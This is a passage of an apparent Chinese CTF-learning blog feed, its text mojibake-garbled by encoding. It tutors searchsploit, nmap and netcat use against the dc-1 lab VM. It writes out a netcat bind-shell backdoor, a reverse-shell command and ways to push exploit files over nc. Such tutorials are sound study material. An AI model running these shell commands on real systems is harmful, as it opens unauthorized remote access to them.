style=\"text-align:left\"><code>searchsploit -t smb windows remote</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-p</td>\n<td style=\"text-align:center\">æ˜¾ç¤ºæ¼æ´åˆ©ç”¨çš„å®Œæ•´è·¯å¾„ï¼Œå°†è·¯å¾„å¤åˆ¶åˆ°å‰ªè´´æ¿</td>\n<td style=\"text-align:left\"><code>searchsploit -p 42315.py</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><span class=\"red\">-m</span></td>\n<td style=\"text-align:center\">å¤åˆ¶åˆ°å½“å‰å·¥ä½œç›®å½•ï¼ŒåŒæ—¶è·å–æ¼æ´çš„å…·ä½“ä¿¡æ¯</td>\n<td style=\"text-align:left\"><code>searchsploit -m 42315.py</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-w</td>\n<td style=\"text-align:center\">è”ç½‘æœç´¢</td>\n<td style=\"text-align:left\"><code>searchsploit -w smb windows remote</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-j</td>\n<td style=\"text-align:center\">ä»¥ json æ ¼å¼æ˜¾ç¤º</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-e</td>\n<td style=\"text-align:center\">å¯¹ exploit æ ‡é¢˜è¿›è¡Œ EXACT åŒ¹é…</td>\n<td style=\"text-align:left\">ç²¾ç¡®åŒ¹é…</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">--exclude</td>\n<td style=\"text-align:center\">é€‰é¡¹åˆ é™¤ä¸æƒ³è¦çš„ç»“æœ</td>\n<td style=\"text-align:left\"><code>searchsploit smb windows remote --exclude=&quot;(POC)|txt&quot;</code></td>\n</tr>\n</tbody>\n</table>\n<p>ä¹Ÿå¯ä»¥ç»“åˆ <code>grep -v</code>  ï¼š  <code>searchsploit XnView | grep -v '/dos/'</code></p>\n<p>searchsploit åé¢å¯ä»¥å¡«å…¥å¤šä¸ªæœç´¢å…³é”®è¯</p>\n<div class=\"note info\">\n<p>æ³¨æ„ï¼šSearchSploit ä½¿ç”¨ AND è¿ç®—ç¬¦ï¼Œè€Œä¸æ˜¯ OR è¿ç®—ç¬¦ã€‚ä½¿ç”¨çš„æœ¯è¯­è¶Šå¤šï¼Œæ»¤é™¤çš„ç»“æœè¶Šå¤šã€‚</p>\n</div>\n<p>è·å–æ›´å¤šç»“æœçš„æœç´¢æŠ€å·§ï¼š</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>Kernel 2.6.25 - &gt;Kernel 2.6 // Kernel 2.x  æŸ¥è¯¢æ›´å¤šç‰ˆæœ¬</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>SQLi -&gt; SQL Injection</code>  æ›´å‡†ç¡®çš„æ¼æ´åç§°</p>\n</li>\n<li class=\"lvl-2\">\n<p>-m é€‰é¡¹åŒæ—¶å¯ä»¥è·å–è¯¥ poc çš„ cve ä¿¡æ¯</p>\n</li>\n</ul>\n<h1 id=\"å¸¸ç”¨å‘½ä»¤\"><a class=\"anchor\" href=\"#å¸¸ç”¨å‘½ä»¤\">#</a> å¸¸ç”¨å‘½ä»¤</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>ç¤ºä¾‹</span></figcaption><table><tr class=\"marked\"><td data-num=\"1\"></td><td><pre>searchsploit afd windows <span class=\"token builtin class-name\">local</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token comment\"># æœç´¢ Windows å¹³å°ä¸Šä¸ AFDï¼ˆAncillary Function Driverï¼‰é©±åŠ¨ç¨‹åºç›¸å…³çš„æœ¬åœ°æ¼æ´ã€‚è¿™é‡Œä¸º \"local\"ï¼Œè¡¨ç¤ºåªæœç´¢æœ¬åœ°æ¼æ´ã€‚</span></pre></td></tr><tr class=\"marked\"><td data-num=\"3\"></td><td><pre> searchsploit <span class=\"token parameter variable\">-t</span> oracle windows</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token comment\"># æœç´¢ä¸ Windows å¹³å°ä¸Šçš„ Oracle è½¯ä»¶ç›¸å…³çš„æ¼æ´ã€‚-t é€‰é¡¹æŒ‡å®šäº†æœç´¢ç»“æœçš„æ ‡é¢˜</span></pre></td></tr><tr class=\"marked\"><td data-num=\"5\"></td><td><pre> searchsploit <span class=\"token parameter variable\">-p</span> <span class=\"token number\">39446</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token comment\"># ç›´æ¥æŸ¥æ‰¾ä¸€ä¸ªå·²çŸ¥çš„æ¼æ´ç¼–å·ä¸º 39446 çš„ Exploit</span></pre></td></tr><tr class=\"marked\"><td data-num=\"7\"></td><td><pre> searchsploit linux kernel <span class=\"token number\">3.2</span> <span class=\"token parameter variable\">--exclude</span> <span class=\"token operator\">=</span>â€œï¼ˆPoCï¼‰<span class=\"token operator\">|</span> / dos /â€</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># æœç´¢ä¸ Linux å†…æ ¸ç‰ˆæœ¬ 3.2 ç›¸å…³çš„æ¼æ´ Exploitã€‚--exclude é€‰é¡¹ç”¨äºæ’é™¤æœç´¢ç»“æœä¸­åŒ…å« \"ï¼ˆPoCï¼‰\" æˆ–è€… \"/dos/\" çš„æ¡ç›®ï¼Œä»¥è¿‡æ»¤æ‰ä¸€äº›ä¸ç›¸å…³çš„ç»“æœã€‚</span></pre></td></tr></table></figure><h1 id=\"æ£€ç´¢ç»“æœ\"><a class=\"anchor\" href=\"#æ£€ç´¢ç»“æœ\">#</a> æ£€ç´¢ç»“æœ</h1>\n<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæœç´¢ç»“æœæ¡ç›®æ¯”è¾ƒå¤šï¼Œä¸€ä¸‹æ˜¯ä¸€äº›è·¯å¾„çš„å«ä¹‰ï¼š</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><code>windows</code> : Windows ç³»ç»Ÿæ¼æ´</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>linux</code> : Linux ç³»ç»Ÿæ¼æ´</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>unix</code> : Unix ç³»ç»Ÿæ¼æ´</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>exploit</code> : å«æœ‰æ¼æ´åˆ©ç”¨ä»£ç çš„æ–‡ä»¶</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>shellcode</code> : å«æœ‰ Shellcode çš„æ–‡ä»¶</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>papers</code> : æ¼æ´ç™½çš®ä¹¦æˆ–æŠ€æœ¯æ–‡ç« </p>\n</li>\n<li class=\"lvl-2\">\n<p><code>exploits</code> : åŒ…å«å„ç§ç±»å‹çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œä¾‹å¦‚æœ¬åœ°æ¼æ´ã€è¿œç¨‹æ¼æ´ã€Web åº”ç”¨ç¨‹åºæ¼æ´ç­‰ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>dos</code> : åŒ…å«æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰æ¼æ´çš„åˆ©ç”¨ä»£ç æˆ–æ¼æ´è¯¦æƒ…ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>remote</code> : åŒ…å«è¿œç¨‹æ¼æ´åˆ©ç”¨ä»£ç æˆ–æ¼æ´è¯¦æƒ…ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>local</code> : åŒ…å«æœ¬åœ°æ¼æ´åˆ©ç”¨ä»£ç æˆ–æ¼æ´è¯¦æƒ…ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>webapps</code> : åŒ…å« Web åº”ç”¨ç¨‹åºæ¼æ´çš„åˆ©ç”¨ä»£ç æˆ–æ¼æ´è¯¦æƒ…ã€‚</p>\n</li>\n</ul>\n<p><strong>è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼š</strong><br />\n <code>txt</code>  ç»“å°¾çš„æ–‡ä»¶ä¸€èˆ¬æ˜¯æ¼æ´æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼Œå…¶ä»–çš„ <code>py</code> , <code>php</code> , <code>pl</code> , <code>rb</code>  ç­‰æ–‡ä»¶å°±æ˜¯å…·ä½“åˆ©ç”¨çš„ expï¼Œéƒ½æ˜¯ä»¥ exp æ¼æ´ç¼–å·å‘½åçš„</p>\n<h1 id=\"å®è·µä¸€ä¸‹\"><a class=\"anchor\" href=\"#å®è·µä¸€ä¸‹\">#</a> å®è·µä¸€ä¸‹</h1>\n<p>ä»¥ dc-1 é¶æœºä¸ºä¾‹ï¼š</p>\n<p>åˆ©ç”¨ <code>nmap -sV -A</code>  æ·±åº¦æ‰«ææ¢æµ‹ç‰ˆæœ¬å·ï¼Œæˆ–è€…åˆ©ç”¨ whatweb è·å–é¶æœºæœåŠ¡ï¼Œä¸ä¼šç”¨ whatweb<a href=\"\"> æˆ³è¿™é‡Œ</a>ã€‚å‘ç°æ˜¯ cms æ¡†æ¶æ˜¯ Drupal  7</p>\n<p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/04/19/w2pJgaxD3Z6BWnH.png\" alt=\"image-20240419194943675\" /></p>\n<p><strong>Path</strong>ï¼šä¸€èˆ¬æ¥è¯´ <code>.txt</code>  æ–‡ä»¶æ˜¯æ¼æ´çš„è¯¦ç»†è¯´æ˜ï¼Œè€Œå…¶ä»–æ–‡ä»¶ä¸€èˆ¬æ˜¯æ”»å‡»ä»£ç å’Œ expï¼Œå·¦è¾¹åˆ™æ˜¯æ¼æ´å¯¹äºçš„ç‰ˆæœ¬å·å’Œæ¼æ´ç±»å‹</p>\n",
            "tags": [
                "Penetration Test",
                "kali tools",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/",
            "url": "https://ctf-learner.github.io/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/",
            "title": "æ‰«æä¸æ­¢ nc&nmap",
            "date_published": "2024-04-19T07:45:49.000Z",
            "content_html": "<p><span class=\"label success\">ä¸Šæ¬¡æ›´æ–°æ—¶é—´ï¼š2024-04-19</span><br />\n å‘ç°è‡ªå·±å‡ ä¹æ¯æ¬¡æ‰«æéƒ½è¦æŸ¥ä¸€æŸ¥å‚æ•°é€‰é¡¹ï¼Œè€Œä¸”æ“ä½œåŠå…¶ç£‹è„šâ€¦â€¦<br />\n ç„¶åç”Ÿäº†è¿™ç¯‡æ–‡ç« ï¼Œç”¨æ¥èƒŒè¯µ</p>\n<h1 id=\"namp\"><a class=\"anchor\" href=\"#namp\">#</a> namp</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token punctuation\">[</span>Scan Type<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>Options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span>target specification<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"ç›®æ ‡è¯´æ˜\"><a class=\"anchor\" href=\"#ç›®æ ‡è¯´æ˜\">#</a> ç›®æ ‡è¯´æ˜</h2>\n<details class=\"primary\"><summary>å®˜æ–¹è§£é‡ŠğŸ‘‡</summary><div>\n<div class=\"note info\">\n<p>ip/&lt;numbit&gt;: Nmap å°†ä¼šæ‰«ææ‰€æœ‰å’Œè¯¥å‚è€ƒ IP åœ°å€å…·æœ‰ &lt;numbit &gt; ç›¸åŒæ¯”ç‰¹çš„æ‰€æœ‰ IP åœ°å€æˆ–ä¸»æœº.</p>\n</div>\n<div class=\"note primary\">\n<p>ä¾‹å¦‚ï¼Œ192.168.10.0/24 å°†ä¼šæ‰«æ 192.168.10.0 å’Œ 192.168.10.255 ä¹‹é—´çš„ 256 å°ä¸»æœºã€‚192.168.10.40/24 å°†ä¼šåšåŒæ ·çš„äº‹æƒ…ã€‚</p>\n</div>\n</div></details>\n<h2 id=\"ä¸»æœºå‘ç°\"><a class=\"anchor\" href=\"#ä¸»æœºå‘ç°\">#</a> ä¸»æœºå‘ç°</h2>\n<table>\n<thead>\n<tr>\n<th>é€‰é¡¹</th>\n<th>ä½œç”¨</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-iL &lt;inputfilename&gt;</td>\n<td>ä»æ–‡ä»¶ä¸­è¾“å…¥</td>\n<td>--excludefile &lt;excludefile&gt; åŒç†</td>\n</tr>\n<tr>\n<td>--exclude &lt;host1[ï¼Œhost2][ï¼Œhost3]ï¼Œ...&gt;</td>\n<td>æ’é™¤ä¸»æœº / ç½‘ç»œ</td>\n<td>ä»¥é€—å·åˆ†éš”çš„åˆ—è¡¨æ’é™¤å®ƒä»¬</td>\n</tr>\n<tr>\n<td>-sL</td>\n<td>åˆ—è¡¨æ‰«æ</td>\n<td>ä»…ä»…åˆ—å‡ºæŒ‡å®šç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºï¼Œ ä¸å‘é€ä»»ä½•æŠ¥æ–‡åˆ°ç›®æ ‡ä¸»æœº</td>\n</tr>\n<tr>\n<td>-sP</td>\n<td>Ping æ‰«æ</td>\n<td>è¿›è¡Œ ping æ‰«æï¼Œæ‰“å°å‡ºå¯¹æ‰«æåšå‡ºå“åº”çš„ä¸»æœº</td>\n</tr>\n<tr>\n<td>-P0</td>\n<td>æ—  ping</td>\n<td>-Pn å¸¸ç”¨</td>\n</tr>\n<tr>\n<td>-n</td>\n<td>ä¸ç”¨åŸŸåè§£æ</td>\n<td>ä¸å¯¹å®ƒå‘ç°çš„æ´»åŠ¨ IP åœ°å€è¿›è¡Œåå‘åŸŸåè§£æ</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"ç«¯å£æ‰«æ\"><a class=\"anchor\" href=\"#ç«¯å£æ‰«æ\">#</a> ç«¯å£æ‰«æ</h2>\n<p>nmap æŠŠç«¯å£åˆ†æˆå…­ä¸ªçŠ¶æ€: open (å¼€æ”¾çš„)ï¼Œ closed (å…³é—­çš„)ï¼Œfiltered (è¢«è¿‡æ»¤çš„)ï¼Œ unfiltered (æœªè¢«è¿‡æ»¤çš„)ï¼Œ open|filtered (å¼€æ”¾æˆ–è€…è¢«è¿‡æ»¤çš„)ï¼Œæˆ–è€… closed|filtered (å…³é—­æˆ–è€…è¢«è¿‡æ»¤çš„)</p>\n<table>\n<thead>\n<tr>\n<th>é€‰é¡¹</th>\n<th>ä½œç”¨</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-sS</td>\n<td>TCP SYN æ‰«æ</td>\n<td><strong>å¸¸ç”¨</strong>ã€å¿«é€Ÿæ‰§è¡Œã€ä¸æ‰“å¼€ä¸€ä¸ªå®Œå…¨çš„ TCP é“¾æ¥</td>\n</tr>\n<tr>\n<td>-sT</td>\n<td>TCP connect () æ‰«æ</td>\n<td></td>\n</tr>\n<tr>\n<td>-sU</td>\n<td>UDP æ‰«æ</td>\n<td>UDP æ‰«æä¸€èˆ¬è¾ƒæ…¢ï¼Œå¯ä»¥ä½¿ç”¨ --host-timeout è·³è¿‡æ…¢é€Ÿçš„ä¸»æœº</td>\n</tr>\n<tr>\n<td>-p &lt;port ranges&gt;</td>\n<td>åªæ‰«ææŒ‡å®šçš„ç«¯å£æˆ–ç«¯å£èŒƒå›´</td>\n<td>-p - ä»ç«¯å£ 1 æ‰«æåˆ° 65535</td>\n</tr>\n<tr>\n<td>-sV</td>\n<td>ç‰ˆæœ¬æ¢æµ‹</td>\n<td>ä¹Ÿå¯ä»¥ - A åŒæ—¶å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œç‰ˆæœ¬æ£€æµ‹</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-aé€‰é¡¹çš„ä½¿ç”¨\"><a class=\"anchor\" href=\"#-aé€‰é¡¹çš„ä½¿ç”¨\">#</a> -A é€‰é¡¹çš„ä½¿ç”¨</h2>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">é€‰é¡¹</th>\n<th>ä½œç”¨</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-A + -sV</td>\n<td>å¯ç”¨ç‰ˆæœ¬æ£€æµ‹ï¼Œç”¨äºè¯†åˆ«ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œçš„æœåŠ¡åŠå…¶ç‰ˆæœ¬ä¿¡æ¯</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A + -O</td>\n<td>å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼Œå°è¯•è¯†åˆ«ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A + -T4</td>\n<td>è®¾ç½®æ‰«æçš„é€Ÿåº¦çº§åˆ«ä¸ºå¿«é€Ÿï¼ˆ4ï¼‰ï¼ŒåŠ å¿«æ‰«æé€Ÿåº¦ä½†å¯èƒ½å¯¼è‡´è¢«æ£€æµ‹åˆ°</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A</td>\n<td>æ‰§è¡Œé«˜çº§æ‰«æå’Œè¯†åˆ«</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"è¾“å‡ºæ ¼å¼\"><a class=\"anchor\" href=\"#è¾“å‡ºæ ¼å¼\">#</a> è¾“å‡ºæ ¼å¼</h2>\n<table>\n<thead>\n<tr>\n<th>é€‰é¡¹</th>\n<th>ä½œç”¨</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-oN &lt;filespec&gt;</td>\n<td>æ ‡å‡†è¾“å‡º</td>\n<td>ç›´æ¥å†™å…¥æŒ‡å®šçš„æ–‡ä»¶</td>\n</tr>\n<tr>\n<td>-oG &lt;filespec&gt;</td>\n<td>Grep è¾“å‡º</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"å¸¸ç”¨å®ä¾‹\"><a class=\"anchor\" href=\"#å¸¸ç”¨å®ä¾‹\">#</a> å¸¸ç”¨å®ä¾‹</h2>\n<div class=\"note warning\">\n<p><strong>æ³¨æ„ï¼š</strong><br />\nå¦‚æœæ˜¯ä¸ºäº†æµ‹è¯•ï¼Œ<a href=\"http://scanme.nmap.org\">scanme.nmap.org</a> å…è®¸è¢«æ‰«æã€‚ä½†ä»…å…è®¸ä½¿ç”¨ Nmap æ‰«æå¹¶ç¦æ­¢æµ‹è¯•æ¼æ´æˆ–è¿›è¡Œ DoS æ”»å‡»ã€‚</p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>/<span class=\"token operator\">&lt;</span>å­ç½‘æ©ç <span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># ç½‘æ®µæ‰«æ</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> ip/å­ç½‘æ©ç  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># æ‰«æå­˜æ´»ä¸»æœº</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token operator\">&lt;</span>ç«¯å£å·æˆ–èŒƒå›´<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>nmap <span class=\"token parameter variable\">-sS</span> -p- <span class=\"token number\">192.168</span>.0.2 <span class=\"token comment\"># æ‰«æä¸»æœºå…¨éƒ¨ç«¯å£</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">172.20</span>.x.x/24</pre></td></tr></table></figure><p>nmap çš„è¿›é˜¶æš‚æ—¶ç”¨ä¸åˆ°ï¼Œæœ‰ç©ºè¡¥å……</p>\n<h1 id=\"ncåŸºç¡€ä½¿ç”¨\"><a class=\"anchor\" href=\"#ncåŸºç¡€ä½¿ç”¨\">#</a> nc åŸºç¡€ä½¿ç”¨</h1>\n<p>ç›‘å¬æœ¬åœ°ç«¯å£</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvvp</span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr></table></figure><p>è¿æ¥æŒ‡å®šç«¯å£</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr></table></figure><h2 id=\"ä¼ é€exp\"><a class=\"anchor\" href=\"#ä¼ é€exp\">#</a> ä¼ é€ exp</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> exp.txt <span class=\"token operator\">|</span> <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nv</span> <span class=\"token number\">192.168</span>.x.x <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nv</span> <span class=\"token number\">192.168</span>.x.x <span class=\"token number\">80</span> <span class=\"token operator\">&lt;</span> exp.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># ä¸¤ç§æ–¹å¼å‡å¯ä»¥è®² exp è¾“é€åˆ°æŒ‡å®šç«¯å£ï¼Œè€ŒæœåŠ¡å™¨éœ€è¦å¼€æ”¾å¯¹åº”ç«¯å£</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span> <span class=\"token operator\">></span> /tmp/received_exploit.txt</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># æœåŠ¡å™¨ç›‘å¬ç«¯å£å¹¶ä¿å­˜ exp</span></pre></td></tr></table></figure><h2 id=\"æ—¥å¿—æ‰“å°\"><a class=\"anchor\" href=\"#æ—¥å¿—æ‰“å°\">#</a> æ—¥å¿—æ‰“å°</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span> <span class=\"token operator\">>></span> /apache/log.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># åœ¨ awd ä¸­ï¼Œæ”»å‡» 80 ç«¯å£çš„ä¿¡æ¯éƒ½ä¼šè¢«æ‰“å°ä¸‹æ¥ï¼Œ> è¡¨ç¤ºè¦†å†™ï¼Œ>> è¡¨ç¤ºè¿½åŠ </span></pre></td></tr></table></figure><h1 id=\"ncå‘½ä»¤è¿›é˜¶ä½¿ç”¨\"><a class=\"anchor\" href=\"#ncå‘½ä»¤è¿›é˜¶ä½¿ç”¨\">#</a> nc å‘½ä»¤è¿›é˜¶ä½¿ç”¨</h1>\n<h2 id=\"åˆ›é€ åé—¨\"><a class=\"anchor\" href=\"#åˆ›é€ åé—¨\">#</a> åˆ›é€ åé—¨</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ncat <span class=\"token parameter variable\">-l</span> <span class=\"token number\">10000</span> <span class=\"token parameter variable\">-e</span> /bin/bash</pre></td></tr></table></figure><p><code>-e</code>  æ ‡å¿—å°†ä¸€ä¸ª  <code>bash</code>  ä¸ç«¯å£  <code>10000</code>  ç›¸è¿ã€‚ç°åœ¨å®¢æˆ·ç«¯åªè¦è¿æ¥åˆ°æœåŠ¡å™¨ä¸Šçš„  <code>10000</code>  ç«¯å£å°±èƒ½é€šè¿‡  <code>bash</code>  è·å–æˆ‘ä»¬ç³»ç»Ÿçš„å®Œæ•´è®¿é—®æƒé™ï¼š</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ncat <span class=\"token number\">192.168</span>.1.100 <span class=\"token number\">10000</span> <span class=\"token comment\"># æ”»å‡»æœºä¸Šè¿æ¥æœåŠ¡å™¨</span></pre></td></tr></table></figure><h2 id=\"æ‰«æç«¯å£\"><a class=\"anchor\" href=\"#æ‰«æç«¯å£\">#</a> æ‰«æç«¯å£</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port-port<span class=\"token operator\">></span></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨ - w è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œ-z æ‰«æï¼Œ-u è®¾ç½®ä¸º UDP æ¨¡å¼ï¼Œä¾‹å¦‚ï¼š</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-u</span> <span class=\"token parameter variable\">-z</span> <span class=\"token parameter variable\">-w2</span> <span class=\"token number\">192.168</span>.0.1 <span class=\"token number\">1</span>-65535 <span class=\"token comment\"># æ‰«æ 192.168.0.3 çš„ç«¯å£ èŒƒå›´æ˜¯ 1-65535 å³å…¨éƒ¨ç«¯å£</span></pre></td></tr></table></figure><div class=\"note warning\">\n<p><strong>æ³¨æ„ï¼šnc æ‰«æä¼šç•™ä¸‹å¤§é‡çš„ç—•è¿¹ã€‚</strong></p>\n</div>\n<h2 id=\"åå‘è¿æ¥å¼¹shell\"><a class=\"anchor\" href=\"#åå‘è¿æ¥å¼¹shell\">#</a> åå‘è¿æ¥å¼¹ shell</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-e</span> /bin/bash <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># æœåŠ¡ç«¯å‘èµ·è¿æ¥</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvp</span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># æ”»å‡»æœºè¿ shell</span></pre></td></tr></table></figure><h1 id=\"å®æˆ˜ä¸€ä¸‹\"><a class=\"anchor\" href=\"#å®æˆ˜ä¸€ä¸‹\">#</a> å®æˆ˜ä¸€ä¸‹</h1>\n<p>æ­£å¥½ç¬¬ä¸€æ¬¡æ‰“é¶æœºå­¦ä¹ æ¸—é€ï¼Œä»¥ dc-1 é¶æœºä¸ºä¾‹</p>\n<p>kali å’Œ dc-1 çš„ç½‘ç»œé€‚é…å™¨éƒ½åœ¨ NET æ¨¡å¼ï¼Œkali çš„ <code>ipï¼š192.168.234.134</code></p>\n<p>å…ˆç®€å•æ‰«æä¸€ä¸‹</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>â””â”€<span class=\"token comment\"># nmap -sP 192.168.234.0/24</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7.94</span> <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-04-15 <span class=\"token number\">11</span>:13 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0037s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAC Address: 00:50:56:C0:00:08 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.2</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00078s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>MAC Address: 00:50:56:E0:4C:0C <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token 